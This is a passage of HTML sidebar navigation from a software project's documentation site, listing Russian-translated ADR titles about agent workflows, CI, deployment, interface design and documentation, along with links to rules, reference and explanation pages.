в файлы, в папку `docs/`</a></li><li><a href="../adr/0196-anamnese-religada-com-sujeito-e-fato-do-perfil.html">ADR 0196 — Anamnese снова включена: не работает без субъекта, а принятая гипотеза становится фактом профиля</a></li><li><a href="../adr/0200-contrato-entre-modulos-artefato-do-arquiteto.html">ADR 0200 — Контракт между модулями становится версионируемым артефактом Arquiteto, и dev agent читает его вместо чужого worktree</a></li><li><a href="../adr/0205-desvio-do-agente-como-sinal-do-produto.html">ADR 0205 — Отклонение агента, которое наблюдает Anamnese, становится сигналом продукта, без персональных данных</a></li></ul></li><li><span>Interface web e design system</span><ul><li><a href="../adr/0036-telas-de-auth-fieis-ao-design-e-fontes-auto-hospedadas.html">ADR 0036 — Экраны аутентификации, верные дизайну, и три шрифта, которые не загружались</a></li><li><a href="../adr/0060-superficie-de-leitura-de-codigo.html">ADR 0060 — Поверхность чтения кода, ограниченная и с бюджетом</a></li><li><a href="../adr/0074-tema-alcancavel-e-o-boot-sob-csp.html">ADR 0074 — Достижимая тема и загрузка под CSP</a></li><li><a href="../adr/0078-moldura-de-tela-e-o-registro-de-abas-diverge-do-handoff.html">ADR 0078 — Рамка экрана, и реестр вкладок намеренно расходится с handoff</a></li><li><a href="../adr/0097-leitura-direta-do-schema-do-engine-para-online-agent-count.html">ADR 0097 — Прямое чтение схемы engine для &quot;N агентов онлайн&quot; на дашборде</a></li><li><a href="../adr/0116-tipos-do-web-gerados-do-openapi.html">ADR 0116 — `ActionType` (и будущие типы) генерируются из контракта OpenAPI, а не копируются вручную</a></li><li><a href="../adr/0122-sessionpage-dividido-em-cinco-prs.html">ADR 0122 — `SessionPage.tsx`, разделённый на пять механических PR, объявленных заранее</a></li><li><a href="../adr/0124-hook-do-canal-de-turno-do-sessionpage.html">ADR 0124 — Группировка состояния канала хода, извлечённая в `useTurnoDoAgente`</a></li><li><a href="../adr/0125-projectsettingstab-dividido-por-secao.html">ADR 0125 — `ProjectSettingsTab.tsx` разделён на файл на раздел, за barrel</a></li><li><a href="../adr/0126-trilho-vertical-de-navegacao-do-projeto.html">ADR 0126 — Страница проекта навигируется вертикальной рейкой, а вкладка Código перестаёт сама сворачивать sidebar</a></li><li><a href="../adr/0176-sessionpage-abaixo-de-mil-linhas.html">ADR 0176 — `SessionPage.tsx` меньше 1 000 строк, за десять механических PR, а замок — только после</a></li><li><a href="../adr/0181-tema-preto-neutro.html">ADR 0181 — Тёмная тема становится нейтрально-чёрной, и долг контраста заканчивается</a></li><li><a href="../adr/0210-animacao-de-texto-com-motion.html">ADR 0210 — Анимация текста с `motion`</a></li><li><a href="../adr/0211-uma-navegacao-so-a-sidebar-absorve-o-trilho.html">ADR 0211 — Одна навигация: боковая панель поглощает рельс проекта</a></li><li><a href="../adr/0232-shadcn-com-base-ui-no-apps-web.html">ADR 0232 — shadcn/ui с Base UI и Tailwind 4 в `apps/web`</a></li><li><a href="../adr/0234-shiki-e-recharts-por-carga-dinamica.html">ADR 0234 — `shiki` в Code Block и `recharts` в Chart, всегда динамической загрузкой</a></li><li><a href="../adr/0237-o-visual-v3-liga-o-preflight-e-sobe-os-raios.html">ADR 0237 — Визуал v3 включает preflight и увеличивает радиусы</a></li><li><a href="../adr/0238-o-grafo-de-modulos-vira-canvas-xyflow.html">ADR 0238 — Граф модулей вкладки Arquitetura становится Canvas (`@xyflow/react`)</a></li><li><a href="../adr/0239-csp-frame-src-local-para-o-web-preview.html">ADR 0239 — Локальный CSP `frame-src` для Web preview результата</a></li><li><a href="../adr/0240-o-motivo-de-controle-inerte-mora-num-ponto-de-interrogacao-nos-containers.html">ADR 0240 — Причина неактивного элемента управления может жить в активном «?» на странице Containers</a></li><li><a href="../adr/0241-a-sidebar-adota-o-block-sidebar-07-do-shadcn.html">ADR 0241 — Sidebar принимает блок `sidebar-07` из shadcn</a></li><li><a href="../adr/0242-containers-em-tabela-linear-com-tanstack-react-table.html">ADR 0242 — Containers в линейной таблице с `@tanstack/react-table`</a></li><li><a href="../adr/0243-consequencia-irreversivel-pode-morar-num-botao-de-perigo.html">ADR 0243 — Необратимое последствие может жить в кнопке опасности</a></li><li><a href="../adr/0244-coluna-das-abas-do-projeto-alinhada-a-esquerda.html">ADR 0244 — Колонка вкладок проекта выровнена по левому краю</a></li><li><a href="../adr/0248-conteudo-das-paginas-ocupa-a-largura-inteira.html">ADR 0248 — Содержимое страниц занимает всю ширину</a></li><li><a href="../adr/0250-chat-da-sessao-ocupa-a-largura-inteira.html">ADR 0250 — Чат сессии занимает всю ширину</a></li></ul></li><li><span>Operação, deploy e instalação</span><ul><li><a href="../adr/0024-fase5-imagens-producao-ci.html">ADR 0024 — Фаза 5 (сессия 1): production-образы, compose.prod, CI и smoke-тест</a></li><li><a href="../adr/0025-fase5-deploy-kubernetes-kustomize.html">ADR 0025 — Фаза 5 (сессия 2): деплой в Kubernetes с Kustomize, метрика очереди и локальный overlay</a></li><li><a href="../adr/0026-fase5-observabilidade-e-graceful-shutdown.html">ADR 0026 — Фаза 5 (сессия 3): graceful shutdown, OpenTelemetry, метрики, логи и дашборды</a></li><li><a href="../adr/0027-fase5-backup-hardening-release.html">ADR 0027 — Backup/restore, усиление api, открытая поверхность и релиз</a></li><li><a href="../adr/0035-observabilidade-legivel-e-trace-sem-coletor.html">ADR 0035 — Trace без коллектора и путь между слоями в логе</a></li><li><a href="../adr/0070-observabilidade-no-compose-local.html">ADR 0070 — Наблюдаемость в локальном Compose: метрики и журналы, без трассировки</a></li><li><a href="../adr/0150-instalador-de-uma-linha.html">ADR 0150 — Установщик одной строкой, с выбранным источником и маркером</a></li><li><a href="../adr/0152-backup-de-volumes-contra-compose.html">ADR 0152 — Резервное копирование и восстановление томов для compose</a></li><li><a href="../adr/0153-deploy-enabled-o-gatilho-que-ninguem-cria.html">ADR 0153 — `DEPLOY_ENABLED`: триггер, который упоминают десять документов и не создаёт ни один</a></li><li><a href="../adr/0155-a-primeira-conta-nasce-no-terminal.html">ADR 0155 — Первая учётная запись рождается в терминале, а локальный агент поднимается сопряжённым</a></li><li><a href="../adr/0160-o-compose-do-instalador-viaja-assinado.html">ADR 0160 — Compose установщика едет вместе с ним, как подписанный asset</a></li><li><a href="../adr/0161-a-tela-so-oferece-o-modo-que-a-instalacao-executa.html">ADR 0161 — Экран предлагает только тот режим, который выполняет установка, а у установки через Release нет broker</a></li><li><a href="../adr/0162-broker-publicado-e-oferecido-pelo-instalador.html">ADR 0162 — Broker становится пятым опубликованным образом, а установщик СПРАШИВАЕТ, включать ли его</a></li><li><a href="../adr/0169-seaweedfs-no-lugar-do-minio-no-overlay-local.html">ADR 0169 — Назначением S3 локального overlay перестаёт быть MinIO и становится SeaweedFS</a></li><li><a href="../adr/0170-compose-de-dev-brabo-dev.html">ADR 0170 — Dev-compose становится `brabo-dev`, и dev отказывается подниматься рядом с установкой</a></li><li><a href="../adr/0209-engine-em-otp-29.html">ADR 0209 — Engine переходит на Elixir 1.20.4 / OTP 29.1.1</a></li><li><a href="../adr/0256-a-migracao-restaura-o-banco-num-banco-vazio.html">ADR 0256 — Миграция установщика восстанавливает базу в только что созданную пустую базу</a></li></ul></li><li><span>CI, release e cadeia de suprimentos</span><ul><li><a href="../adr/0039-actionlint-e-validacao-do-pipeline-de-ci-gerado.html">ADR 0039 — actionlint и валидация генерируемого конвейера CI</a></li><li><a href="../adr/0119-imagens-publicadas-no-ghcr-por-digest.html">ADR 0119 — Образы, публикуемые в GHCR с каждым финальным тегом, и production overlay, закреплённый по digest</a></li><li><a href="../adr/0120-e2e-de-navegador-contra-o-compose-de-producao.html">ADR 0120 — Браузерный E2E против продакшен-compose, в пакете вне workspace</a></li><li><a href="../adr/0121-schema-dividido-por-agregado-de-dominio.html">ADR 0121 — Схема, разделённая по доменным агрегатам, за barrel</a></li><li><a href="../adr/0140-timeout-do-audit-como-risco-assumido.html">ADR 0140 — Повторяющийся timeout `pnpm audit` — принятый риск; находка по-прежнему отклоняет</a></li><li><a href="../adr/0149-assinatura-dos-artefatos-publicados.html">ADR 0149 — Подпись опубликованных артефактов</a></li><li><a href="../adr/0159-imagem-de-terceiro-por-digest.html">ADR 0159 — Сторонний образ входит по digest, и lint проваливает того, кто забудет</a></li><li><a href="../adr/0172-trivy-no-release-antes-de-assinar.html">ADR 0172 — Релиз сканирует Trivy то, что публикует, по digest, до подписи</a></li><li><a href="../adr/0178-tag-inline-na-imagem-de-terceiro.html">ADR 0178 — Тег стороннего образа живёт ВНУТРИ ссылки, перед digest</a></li><li><a href="../adr/0197-a-imagem-dos-workflows-vem-do-compose.html">ADR 0197 — Образ workflows берётся из compose, и Dependabot для образов включается</a></li><li><a href="../adr/0252-o-brabo-vira-um-conjunto-de-repositorios.html">ADR 0252 — Brabo становится набором репозиториев в `viralabs-dev`</a></li></ul></li><li><span>Documentação</span><ul><li><a href="../adr/0029-sincronizacao-continua-da-documentacao.html">ADR 0029 — Непрерывная синхронизация документации</a></li><li><a href="../adr/0033-referencia-de-api-gerada-do-openapi.html">ADR 0033 — Справочник API выводится из кода, а табличный тест требует метаданных</a></li><li><a href="../adr/0034-documentacao-publicada-por-degrau.html">ADR 0034 — Документация, публикуемая по ступеням, в подкаталоге Pages</a></li><li><a href="../adr/0071-publicacao-simetrica-por-degrau.html">ADR 0071 — Симметричная публикация по ступеням и корень, который предлагает выбор</a></li><li><a href="../adr/0073-o-caminho-publicado-nomeia-o-ambiente.html">ADR 0073 — Публикуемый путь называет окружение, а не ветку</a></li><li><a href="../adr/0117-lockfile-proprio-para-o-website.html">ADR 0117 — `website/` получает собственный lockfile, вне `pnpm audit` продукта</a></li><li><a href="../adr/0202-o-indice-de-adr-por-tema.html">ADR 0202 — Индекс ADR по темам, с темой вне ADR</a></li><li><a href="../adr/0206-referencia-da-api-numa-pagina-redoc.html">ADR 0206 — Справочник API становится страницей Redoc</a></li><li><a href="../adr/0216-quatro-idiomas-com-pt-br-como-fonte.html">ADR 0216 — Четыре языка, с pt-BR как ИСТОЧНИКОМ и языком по умолчанию: документация и интерфейс на португальском, английском, русском и упрощённом китайском</a></li><li><a href="../adr/0218-titulo-de-adr-com-prefixo.html">ADR 0218 — Каждый ADR называется «ADR NNNN — заголовок»</a></li><li><a href="../adr/0219-referencia-entra-na-traducao.html">ADR 0219 — Справочник входит в перевод</a></li><li><a href="../adr/0220-api-traduzida-por-catalogo.html">ADR 0220 — Страница API переводится по каталогу</a></li><li><a href="../adr/0253-o-site-de-docs-deixa-o-docusaurus.html">ADR 0253 — Сайт документации отказывается от Docusaurus</a></li><li><a href="../adr/0254-a-doc-de-cada-area-mora-na-raiz-dela.html">ADR 0254 — Документация каждой области живёт в её корне</a></li><li><a href="../adr/0260-doc-dos-repos-de-codigo-so-em-ingles.html">ADR 0260 — Документация репозиториев с кодом только на английском; сайт отдаёт английский источник с полосой</a></li><li><a href="../adr/0266-doc-dos-repositorios-em-portugues-por-padrao.html">ADR 0266 — A doc dos repositórios é em pt-BR por padrão, com traduções permitidas nos irmãos</a></li></ul></li></ul></li></ul></section><section><h2>📐 Правила</h2><ul><li><a href="../business-rules.html">Бизнес-правила</a></li><li><a href="../business-rules/custo.html">Стоимость и metering</a></li><li><a href="../business-rules/autenticacao.html">Аутентификация</a></li><li><a href="../business-rules/api.html">API</a></li><li><a href="../business-rules/broker.html">Broker</a></li><li><a href="../business-rules/ci.html">CI</a></li><li><a href="../business-rules/contracts.html">Contracts</a></li><li><a href="../business-rules/engine.html">Engine</a></li><li><a href="../business-rules/infra.html">Infra</a></li><li><a href="../business-rules/produto.html">Produto</a></li><li><a href="../business-rules/runner.html">Runner</a></li><li><a href="../business-rules/web.html">Web</a></li></ul></section><section><h2>📖 Справочник</h2><ul><li><a href="../reference/configuration.html">Configuração</a></li><li><a href="../reference/events.html">Eventos</a></li><li><a href="../reference/permissions.html" aria-current="page">Permissões</a></li><li><a href="../reference/artifacts.html">Artefatos</a></li><li><a href="../reference/git-providers.html">Provedores de git</a></li><li><a href="../reference/internal-api.html">API interna</a></li><li><a href="../reference/scripts.html">Scripts e comandos</a></li><li><a href="../reference/rulesets.html">Rulesets do repositório</a></li><li><a href="../reference/paridade-de-traducao.html">Paridade de tradução</a></li><li><a href="../reference/brb.html">Registro BRB</a></li><li><a href="../security-surface.html">Api's Exposed Surface</a></li><li><span>Справочник API</span></li></ul></section><section><h2>💡 Пояснения</h2><ul><li><span>Процесс и конвейер</span><ul><li><a href="../explanation/documentation-workflow.html">Синхронизация документации</a></li><li><a href="../explanation/branching-policy.html">Политика веток</a></li><li><a href="../explanation/cadeia-de-suprimentos-do-ci.html">Цепочка поставок CI</a></li><li><a href="../explanation/release-do-produto.html">Релиз продукта</a></li><li><a href="../explanation/gates.html">Gates и то, как они измеряются</a></li><li><a href="../explanation/observability.html">Observability</a></li><li><a href="../explanation/modelo-de-time.html">Модель команды и поток результатов</a></li></ul></li><li><span>Проверки и измерения</span><ul><li><a href="../explanation/primeiro-dogfooding.html">Первый dogfooding</a></li><li><a href="../explanation/execucao-real-hello-world.html">Реальное выполнение (hello world)</a></li><li><a href="../explanation/achados-execucao-real.html">Находки реального прогона конвейера</a></li><li><a href="../explanation/validacao-fase-12.html">Проверка Фазы 12</a></li><li><a href="../explanation/validacao-real.html">Реальная валидация (13b)</a></li><li><a href="../explanation/aceite-providers.html">Provider acceptance</a></li><li><a href="../explanation/medicao-do-idioma.html">Измерение эвристики языка</a></li><li><a href="../explanation/medicao-do-jev.html">Измерение маршрутизатора инструментов Jev</a></li><li><a href="../explanation/auditoria-fluxo-vs-codigo.html">Аудит: fluxo.yml × код (v3, ADR 0085)</a></li><li><a href="../explanation/auditoria-visual-rodada-29.html">Визуальный аудит до и после Rodada 29</a></li></ul></li><li><span>История фаз</span><ul><li><a href="../explanation/historico-de-fases.html">История фаз</a></li><li><a href="../explanation/fase-28-pasta-do-usuario.html">ФАЗА 28 — папка пользователя</a></li><li><a href="../explanation/fase-29-instalacao-de-uma-linha.html">FASE 29 — установка одной строкой</a></li><li><a href="../explanation/fase-30-runner-por-maquina.html">FASE 30 — локальный агент машины</a></li><li><a href="../explanation/backlog.html">Backlog после триажа</a></li></ul></li><li><span>Локализация</span><ul><li><a href="../explanation/localizacao.html">Локализация</a></li><li><a href="../explanation/localizacao-en.html">Локализация — английский (en)</a></li><li><a href="../explanation/localizacao-ru.html">Локализация — русский (ru)</a></li><li><a href="../explanation/localizacao-zh-hans.html">Локализация — упрощённый китайский (zh-Hans)</a></li></ul></li><li><span>Технические заметки</span><ul><li><a href="../explanation/tanstack-ai.html">TanStack AI — not adopted</a></li></ul></li></ul></section><section><h2>🛠️ Эксплуатация</h2><ul><li><a href="../runbook.html">Runbook</a></li></ul></section><section><h2>📚 Словарь</h2><ul><li><a href="../glossary.html">Глоссарий</a></li></ul></section><section><h2>🤝 Участие</h2><ul><li><a href="https://github.com/viralabs-dev/brabo/blob/dev/CONTRIBUTING.md">Как внести вклад</a></li><li><a href="https://github.com/viralabs-dev/brabo/blob/dev/SUPPORT.md">Где попросить помощи</a></li><li><a href="https://github.com/viralabs-dev/brabo/blob/dev/SECURITY.md">Сообщить об уязвимости</a></li></ul></section></nav>
+<nav class="site-side" aria-label="docs"><section><h2>🚀 Начните здесь</h2><ul><li><a href="../index.html">Введение</a></li><li><a href="../getting-started.html">Первые шаги</a></li><li><a href="../tutorials/from-zero-to-deliverable.html">С нуля до готового результата</a></li><li><a href="../tutorials/interface-antes-e-depois-shadcn.html">Интерфейс до и после shadcn (31.10.2026)</a></li></ul></section><section><h2>🏗️ Архитектура</h2><ul><li><a href="../architecture.html">Архитектура</a></li><li><a href="../adr.html">Решения (ADR)</a><ul><li><span>Git, repositório e política de branches</span><ul><li><a href="../adr/0001-git-provider-contract-shape.html">ADR 0001 — Формат нормализованного контракта GitProvider</a></li><li><a href="../adr/0002-git-error-normalization.html">ADR 0002 — Нормализация ошибок GitProvider</a></li><li><a href="../adr/0003-git-provider-retry-policy.html">ADR 0003 — Политика повторов для удалённых providers</a></li><li><a href="../adr/0004-git-credential-registration.html">ADR 0004 — Регистрация git-учётных данных пользователя</a></li><li><a href="../adr/0005-repo-bootstrap-idempotent-steps.html">ADR 0005 — Идемпотентный и возобновляемый bootstrap Gitflow</a></li><li><a href="../adr/0028-protecao-de-branch-divergencia-entre-providers.html">ADR 0028 — Защита веток: расхождение между providers и матрица одобрения</a></li><li><a href="../adr/0030-politica-de-branches-mecanizada.html">ADR 0030 — Механизированная политика веток</a></li><li><a href="../adr/0044-adocao-de-repositorio-existente.html">ADR 0044 — Усыновление существующего репозитория и план как шлюз</a></li><li><a href="../adr/0056-o-engine-trabalha-em-repositorio-remoto.html">ADR 0056 — Engine работает в удалённом репозитории</a></li><li><a href="../adr/0139-o-alarme-de-esteira-ganha-destinatario.html">ADR 0139 — Сигнал тревоги о merge конвейера получает адресата и правило для `dev`</a></li><li><a href="../adr/0165-o-repositorio-nasce-no-handoff-ao-arquiteto.html">ADR 0165 — Репозиторий рождается при принятии handoff Arquiteto, и исполнение без него не начинается</a></li><li><a href="../adr/0217-promocao-automatica-para-qa-em-fase-de-teste.html">ADR 0217 — Автоматическое продвижение `dev` → `qa`, пока QA находится в тестовой фазе</a></li><li><a href="../adr/0235-a-qa-e-aposentada-e-a-esteira-fica-dev-e-main.html">ADR 0235 — `qa` пока выводится из обращения, а конвейер репозитория становится `dev → main`</a></li><li><a href="../adr/0236-o-dependabot-dispensa-revisao-na-dev.html">ADR 0236 — Dependabot освобождается от ревью в `dev` и становится пригоден к merge при зелёных остальных проверках</a></li><li><a href="../adr/0255-politica-de-pr-obrigatoria-em-todos-os-repos.html">ADR 0255 — Политика PR обязательна во всех репозиториях, а PR регенерации от бота освобождается от лестницы в dev</a></li><li><a href="../adr/0263-o-projeto-do-usuario-trabalha-em-trunk.html">ADR 0263 — O projeto do usuário trabalha em trunk, e a pasta acompanha a main</a></li></ul></li><li><span>Harness de agente, turnos e sessões</span><ul><li><a href="../adr/0006-prompt-assembler-context-harness.html">ADR 0006 — Harness агентов: детерминированная сборка контекста</a></li><li><a href="../adr/0007-toolloop-tools-context-manager.html">ADR 0007 — ToolLoop, инструменты, ContextManager (harness с LLM)</a></li><li><a href="../adr/0061-tipo-da-sessao-na-criacao.html">ADR 0061 — Тип сессии — это данные создания, а выполнение остаётся событием</a></li><li><a href="../adr/0098-limites-de-transporte-e-janela-efetiva-de-compactacao.html">ADR 0098 — Согласованные пределы транспорта и эффективное окно сжатия</a></li><li><a href="../adr/0163-o-clique-responde-ao-aceitar.html">ADR 0163 — Клик отвечает при ПРИНЯТИИ команды, а ход продолжается через канал</a></li><li><a href="../adr/0175-infra-lead-conversa-pelo-composer.html">ADR 0175 — Infra Lead разговаривает через composer, а прежде его ход проходит через `TurnoAssincrono`</a></li><li><a href="../adr/0177-idioma-das-respostas-por-conta-sessao-e-projeto.html">ADR 0177 — Язык ответов живёт в трёх местах — учётная запись, сессия и проект, — в открытом списке BCP-47 и никогда в `users.locale`</a></li><li><a href="../adr/0179-o-laco-pergunta-ao-jev-qual-ferramenta.html">ADR 0179 — Цикл спрашивает Jev, какой инструмент, а модель пользователя видит только оставшееся меню</a></li><li><a href="../adr/0183-reabrir-sessao-encerrada.html">ADR 0183 — Закрытую сессию можно открыть снова: собственный выход из терминальных состояний, в `active`, с новым событием</a></li><li><a href="../adr/0184-reabrir-sessao-decisoes-do-dono.html">ADR 0184 — Повторное открытие сессии: три решения владельца, и `developer` открывает снова</a></li><li><a href="../adr/0191-a-mensagem-com-turno-em-curso-entra-numa-fila.html">ADR 0191 — Сообщение, пришедшее во время идущего хода, попадает в сохраняемую очередь и читается в конце хода</a></li><li><a href="../adr/0226-diario-vivo-e-retomada-dos-agentes.html">ADR 0226 — Живой дневник и возобновление агентов: прерванный ход возвращается один раз, по плану</a></li><li><a href="../adr/0246-anexos-do-chat-bytes-no-postgres-referencia-no-evento.html">ADR 0246 — Вложения чата: байты в Postgres, ссылка в событии, зрение по capability</a></li><li><a href="../adr/0247-uma-mensagem-varios-destinatarios.html">ADR 0247 — Одно сообщение, несколько адресатов</a></li><li><a href="../adr/0249-o-raciocinio-do-agente-e-gravado-e-mostrado-so-a-developer.html">ADR 0249 — Рассуждение агента записывается и показывается только developer и выше</a></li></ul></li><li><span>O time de agentes — papéis, áreas e handoffs</span><ul><li><a href="../adr/0008-agente-criativo-conversacional-handoffs.html">ADR 0008 — Разговорный агент Criativo в harness + фундамент handoffs</a></li><li><a href="../adr/0009-agente-po-backlog-rastreabilidade.html">ADR 0009 — Агент PO, backlog (epics/stories/tasks) и прослеживаемость</a></li><li><a href="../adr/0010-agente-arquiteto-adr-pr-module-map.html">ADR 0010 — Агент Arquiteto: ADR через настоящую PR, module_map и перекрёстная валидация</a></li><li><a href="../adr/0014-infra-agent-painel-phoenix.html">ADR 0014 — InfraAgent и живая панель команды (закрытие Фазы 4a)</a></li><li><a href="../adr/0015-psicologo-real-toolloop-hipoteses-evidencia.html">ADR 0015 — Настоящий Psicólogo: ToolLoop, гипотезы с доказательствами и сортировка по стоимости</a></li><li><a href="../adr/0016-anamnese-proficiencia-patches-instrucao.html">ADR 0016 — Anamnese: профиль владения навыками, патчи инструкций и замкнутый цикл</a></li><li><a href="../adr/0022-fechamento-4b-psicologo.html">ADR 0022 — Закрытие Фазы 4b (сессия 1): доказательство, которое доходит, стоимость, которая видна, анализ, который переживает kill</a></li><li><a href="../adr/0023-fechamento-4b-anamnese.html">ADR 0023 — Закрытие Фазы 4b (сессия 2): работающий каталог, дедупликация, различающая, кто отказал, и очередь, переживающая раунд</a></li><li><a href="../adr/0038-hierarquia-de-agentes.html">ADR 0038 — Иерархия агентов: области, leads и делегирование</a></li><li><a href="../adr/0046-promocao-de-story-com-autoridade-do-usuario.html">ADR 0046 — Продвижение истории с полномочиями пользователя</a></li><li><a href="../adr/0053-dev-lead-e-paralelismo-autorizado.html">ADR 0053 — Dev Lead как область и параллелизм, разрешённый пользователем</a></li><li><a href="../adr/0068-diagrama-c4-do-arquiteto.html">ADR 0068 — Диаграмма C4 Arquiteto</a></li><li><a href="../adr/0069-fusao-condicional-do-handoff-com-a-ativacao-de-execucao.html">ADR 0069 — Условное слияние принятия handoff с включением выполнения</a></li><li><a href="../adr/0085-fluxo-como-registro-declarativo.html">ADR 0085 — Поток ролей как декларативный реестр (fluxo.yml)</a></li><li><a href="../adr/0086-dev-lead-plano-suspende-para-aprovacao.html">ADR 0086 — План Dev Lead приостанавливает ход до одобрения</a></li><li><a href="../adr/0087-ux-designer-agente.html">ADR 0087 — UX Designer входит как разговорный агент</a></li><li><a href="../adr/0088-staff-agente-dormente-para-disparo-automatico.html">ADR 0088 — Staff: код готов, спящий для автоматического запуска</a></li><li><a href="../adr/0089-analytics-e-delivery-metricas-como-relatorio.html">ADR 0089 — `analytics` и `delivery-metricas` становятся скриптом отчёта</a></li><li><a href="../adr/0092-platform-relatorio-de-telemetria-sob-demanda.html">ADR 0092 — `platform` рождается как скрипт отчёта по требованию, а не агент</a></li><li><a href="../adr/0093-dbre-linter-de-migracao-e-relatorio-de-backup.html">ADR 0093 — Роль `dbre` становится двумя скриптами: линтер миграций и отчёт о резервном копировании</a></li><li><a href="../adr/0094-delegacao-dev-lead-vira-dado.html">ADR 0094 — Делегирование Dev Lead → dev становится данными, с переопределённым `parecerArtifactId`</a></li><li><a href="../adr/0109-handoff-manual-a-agente-a-escolha.html">ADR 0109 — Ручной handoff агенту по выбору переиспользует предложение+принятие, а не третье состояние handoff</a></li><li><a href="../adr/0182-ciclo-de-vida-do-handoff.html">ADR 0182 — Предложение handoff получает жизненный цикл: одно ожидающее на получателя и `superseded`</a></li><li><a href="../adr/0185-estou-pronto-fecha-os-dois-gates.html">ADR 0185 — «Estou pronto — a necessidade está validada»: один клик закрывает готовность, gate `necessidade-validada` и принятие PO</a></li><li><a href="../adr/0186-aceite-automatico-do-handoff-ao-arquiteto.html">ADR 0186 — Handoff от PO к Arquiteto принимается без клика, когда backlog покрыт и репозиторий локальный</a></li><li><a href="../adr/0194-aprovar-o-plano-ativa-a-execucao.html">ADR 0194 — Одобрение плана Dev Lead активирует выполнение, а задача получает модуль, который он назначает</a></li><li><a href="../adr/0212-historia-arquivada.html">ADR 0212 — Архивированная история: колонка, а не состояние машины</a></li><li><a href="../adr/0213-o-entregavel-roda-na-maquina-pelo-compose-da-infra.html">ADR 0213 — Результат работает на машине пользователя через compose от Infra</a></li><li><a href="../adr/0259-o-modulo-de-que-outros-dependem-tem-dono.html">ADR 0259 — У модуля, от которого зависят другие, есть владелец в плане исполнения</a></li><li><a href="../adr/0261-o-dev-lead-e-avisado-de-bloqueios-e-pede-ao-arquiteto.html">ADR 0261 — Dev Lead узнаёт о блокировках и обращается к Архитектору по отдельному каналу</a></li><li><a href="../adr/0262-o-agente-retira-a-regra-de-negocio-obsoleta.html">ADR 0262 — Агент снимает устаревшее бизнес-правило, указывая заменяющее или ответ</a></li></ul></li><li><span>Gates, QA e revisão de segurança</span><ul><li><a href="../adr/0013-gates-qa-secops-pr.html">ADR 0013 — Gates PR: QAAgent и SecOpsAgent</a></li><li><a href="../adr/0020-destravar-gates-qa-secops.html">ADR 0020 — Разблокировать gates QA и SecOps: gitleaks по рабочему дереву, валидируемые заключения и tool call в тексте</a></li><li><a href="../adr/0021-fechamento-4a-infra-e-painel.html">ADR 0021 — Закрытие Фазы 4a: gate infra, который проверяет, и панель, которая говорит правду</a></li><li><a href="../adr/0054-gates-como-registro-declarativo.html">ADR 0054 — Gates как декларативный реестр</a></li><li><a href="../adr/0057-o-gate-espera-a-aprovacao.html">ADR 0057 — Агент gate ждёт одобрения, как ждёт dev</a></li><li><a href="../adr/0067-o-gate-sobrevive-ao-restart.html">ADR 0067 — Gate переживает перезапуск</a></li><li><a href="../adr/0090-qa-estrategia-e-appsec-segundo-momento.html">ADR 0090 — QA-стратегия и AppSec как второй МОМЕНТ, а не новый агент</a></li><li><a href="../adr/0091-secops-runtime-relatorio-de-abuso.html">ADR 0091 — `secops-runtime` как скрипт отчёта по `rate_limit_hits`</a></li><li><a href="../adr/0095-gate-necessidade-validada.html">ADR 0095 — Gate `necessidade-validada` закрывается отдельным подтверждением человека, а не самопроверкой Criativo</a></li><li><a href="../adr/0123-golden-set-regressao-qa-automacao.html">ADR 0123 — Golden-set регрессионных случаев для семантического суждения агента QA Automação</a></li><li><a href="../adr/0168-golden-set-do-qa-em-ci-semanal.html">ADR 0168 — Golden-set QA начинает работать в CI, по расписанию и еженедельно</a></li><li><a href="../adr/0192-plano-de-teste-depois-da-entrega.html">ADR 0192 — План тестирования рождается после сдачи dev, а gate `implementavel` начинает судить по истории и `module_map`</a></li><li><a href="../adr/0207-ciclo-de-gate-velho-estaciona.html">ADR 0207 — Цикл gate, простаивающий более 2 ч, паркуется, и возобновить его может лишь жест человека</a></li><li><a href="../adr/0214-pergunta-em-aberto-vira-pendencia.html">ADR 0214 — Открытый вопрос становится ожидающим решения пунктом</a></li><li><a href="../adr/0215-decisao-do-projeto-chega-ao-dev-e-ao-qa.html">ADR 0215 — Решение проекта доходит до dev и QA</a></li><li><a href="../adr/0258-a-resposta-pelo-chat-fecha-a-pergunta-em-aberto.html">ADR 0258 — Ответ, данный в чате, закрывает открытый вопрос</a></li></ul></li><li><span>Execução, política de terminal e aprovações</span><ul><li><a href="../adr/0011-infra-dev-agents-worktrees-merge-lock.html">ADR 0011 — Инфраструктура dev agents: worktrees, git-исполнители и замок merge</a></li><li><a href="../adr/0012-dev-agent-real-toolloop-orcamento-bloqueio.html">ADR 0012 — Настоящий DevAgent: ToolLoop, бюджет на task и дисциплина блокировки</a></li><li><a href="../adr/0017-lock-de-workspace-e-monitor-de-dev-agents.html">ADR 0017 — Блокировка инициализации workspace, Monitor dev agents и наследование пределов</a></li><li><a href="../adr/0018-noop-dev-agent-modo-de-execucao.html">ADR 0018 — NoopDevAgent как постоянный режим выполнения</a></li><li><a href="../adr/0019-destravar-dev-agent-adr-por-modulo-orcamento-projeto.html">ADR 0019 — Разблокировать реальный DevAgent: запись, терминал, ADR по модулю и бюджет по проекту</a></li><li><a href="../adr/0045-reagendamento-por-evento-do-dev-agent.html">ADR 0045 — Перепланирование dev agent по событию и circuit breaker</a></li><li><a href="../adr/0047-operabilidade-pos-dogfooding.html">ADR 0047 — Эксплуатируемость после dogfooding: закрытие Фазы 12</a></li><li><a href="../adr/0048-decisao-no-log-e-a-ordem-do-gate.html">ADR 0048 — Решение в event log и порядок gate</a></li><li><a href="../adr/0052-dev-agent-espera-aprovacao-no-meio-do-laco.html">ADR 0052 — Dev agent ждёт одобрения посреди цикла</a></li><li><a href="../adr/0055-escopo-de-caminho-na-politica-de-terminal.html">ADR 0055 — Область пути в политике терминала</a></li><li><a href="../adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny.html">ADR 0102 — Пересмотр ADR 0065: граница внешнего эффекта перестаёт быть `deny` и становится абсолютным пределом</a></li><li><a href="../adr/0167-modo-automatico-libera-o-escopo-de-caminho.html">ADR 0167 — Автоматический режим снимает область путей, и только он</a></li><li><a href="../adr/0189-o-piloto-automatico.html">ADR 0189 — Автопилот: автоматический режим одобряет всё, кроме потолков, область сравнивается с реальной папкой исполнения, а «Всегда разрешать» записывает глагол + подкоманду</a></li><li><a href="../adr/0204-modo-automatico-libera-push-e-pr.html">ADR 0204 — Автоматический режим разрешает push и PR</a></li></ul></li><li><span>Onde o código mora — modos de execução</span><ul><li><a href="../adr/0066-nome-de-pasta-legivel-do-workspace.html">ADR 0066 — Читаемое имя папки workspace</a></li><li><a href="../adr/0072-projeto-local-ou-container.html">ADR 0072 — Проект выбирает, где живёт код: папка пользователя или управляемая папка</a></li><li><a 